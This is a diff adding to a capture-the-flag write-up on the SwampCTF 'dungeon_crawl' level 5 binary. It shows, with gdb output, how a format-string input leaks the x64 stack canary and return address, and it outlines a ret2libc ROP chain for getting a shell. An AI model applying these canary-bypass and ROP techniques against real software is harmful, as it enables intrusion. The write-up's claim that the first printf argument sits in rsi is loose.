@@ -516,4 +516,106 @@ How do we read the stack canary value using printf?
 > Instead of a decimal digit string one may write "*" or "*m$" (for some decimal integer m) to specify that the field width is given in the next argument, or in the m-th argument, respectively, which must be of type int.
 [source](https://linux.die.net/man/3/printf)
 
+We know that the stack canary is located at address `rsp+0x208`. In a way, `printf` could treat it as an argument to be printed out. Keep in mind though, now we are dealing with x64 and *not x32*. In x32, arguments are passed through the stack, while in x64, System V AMD64 ABI passes arguments through registers instead. 
+
+```
+Choice [0 exit][1 small][2 large][3 format]: 3
+Path 3 - The possibilities are endless!
+%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx
+0x7fffffffda40:	0x2d786c25	0x2d786c25	0x2d786c25	0x2d786c25
+0x7fffffffda50:	0x2d786c25	0x2d786c25	0x2d786c25	0x2d786c25
+0x7fffffffda60:	0x2d786c25	0x2d786c25	0x2d786c25	0x2d786c25
+0x7fffffffda70:	0x2d786c25	0x0a786c25	0x00000000	0x00000000
+0x7fffffffda80:	0x00400b10	0x00000000	0xf7de6ac6	0x00007fff
+0x7fffffffda90:	0x00000001	0x00000000	0x00000000	0x00000000
+0x7fffffffdaa0:	0x00000000	0xff000000	0xf7a15148	0x00007fff
+0x7fffffffdab0:	0xffffdc40	0x00007fff	0xf7dee923	0x00007fff
+rax            0x0	0
+rbx            0x0	0
+rcx            0x2d786c252d786c25	3276487635844492325
+rdx            0x7ffff7dd3790	140737351858064
+rsi            0x602048	6299720
+rdi            0x7fffffffda40	140737488345664
+rbp            0x400b10	0x400b10 <__libc_csu_init>
+rsp            0x7fffffffda40	0x7fffffffda40
+r8             0x602048	6299720
+r9             0x2d786c252d786c25	3276487635844492325
+r10            0x2d786c252d786c25	3276487635844492325
+r11            0x246	582
+r12            0x4008a0	4196512
+r13            0x7fffffffdd50	140737488346448
+r14            0x0	0
+r15            0x0	0
+rip            0x400a9d	0x400a9d <format_string+61>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+---Type <return> to continue, or q <return> to quit---
+
+Breakpoint 1, 0x0000000000400a9d in format_string ()
+=> 0x0000000000400a9d <format_string+61>:	e8 9e fc ff ff	call   0x400740 <printf@plt>
+(gdb) c
+Continuing.
+602048-7ffff7dd3790-2d786c252d786c25-602048-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-a786c252d786c25-0-400b10
+Still alive?
+```
+The output may seem confusing especially when many registers have the same values. You will notice, however, that this output agrees with [System V AMD ABI x64 calling convention in Wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions) that the 1st argument is in `rsi`, the 2nd is in `rdx`, the 3rd is in `rcx`, the 4th is in `r8`, the 5th is in `r9`, and the subsequent ones are in the stack starting from the lower memory address. The stack canary is 0x208 bytes away from the top of the stack. In other words, it's the 66th QWORD in the stack (including the one on the top of the stack). Since the first 5 arguments are in the registers, that makes the stack canary the 71st argument to `printf`. Thus, the format string we use to print its value is `%71$lx`. We use `%lx` instead of `%x` because the stack canary is 64 bits large. `%x` prints only 32 bits.
+
+Let's check if our guess is correct. 
+```
+(gdb) define hook-stop
+Redefine command "hook-stop"? (y or n) y
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>p/x $rax
+>x/2xw $rsp+0x208
+>end
+(gdb) r
+Starting program: /home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level5 
+[...]
+Choice [0 exit][1 small][2 large][3 format]: 3
+Path 3 - The possibilities are endless!
+%71$lx
+2c7dc6248a7eac00
+$3 = 0x2c7dc6248a7eac00
+0x7fffffffdc48:	0x8a7eac00	0x2c7dc624
+
+Breakpoint 2, 0x0000000000400aaa in format_string ()
+=> 0x0000000000400aaa <format_string+74>:	64 48 33 04 25 28 00 00 00	xor    rax,QWORD PTR fs:0x28
+(gdb) 
+```
+`2c7dc6248a7eac00` is the value printed out by `printf`. `$3 = 0x2c7dc6248a7eac00` is the value of `rax` after the instruction `mov    rax,QWORD PTR [rsp+0x208]` is executed. `0x7fffffffdc48:	0x8a7eac00	0x2c7dc624` is the memory dump of the stack canary itself. Since the memory dump shows the same value printed by `printf`, we know our format string is correct. We will use that value in our exploit input so that we will not change the stack canary's value, thereby bypassing the stack protection. This means we are free to override the return address from `<format_string>`.
+
+Because the stack is not executable, we shall use the good old ROP to ret2libc. This is the pseudocode of what we will do to obtain a shell. This ROP chain contains 3 ROP gadgets.
+```
+1. Pop address of /bin/sh to rdi
+2. Set rsi and rdx to 0x0. 
+3. Return to <execve> in libc.
+```
+
 To be continued...
+```
+(gdb) x/2xw $rsp+0x218
+0x7fffffffdc58:	0x00400819	0x00000000
+(gdb) x/2xw $rsp+0x208
+0x7fffffffdc48:	0x95c67500	0x6dee953e
+(gdb) c
+Continuing.
+[Inferior 1 (process 11770) exited with code 016]
+Error while running hook_stop:
+No registers.
+(gdb) r
+Starting program: /home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level5 
+----- LEVEL 5 -----
+This is your final task - defeat this level and you will be rewarded.
+Choose your path to victory...
+
+Choice [0 exit][1 small][2 large][3 format]: 3
+Path 3 - The possibilities are endless!
+%73$p
+0x400819
+```
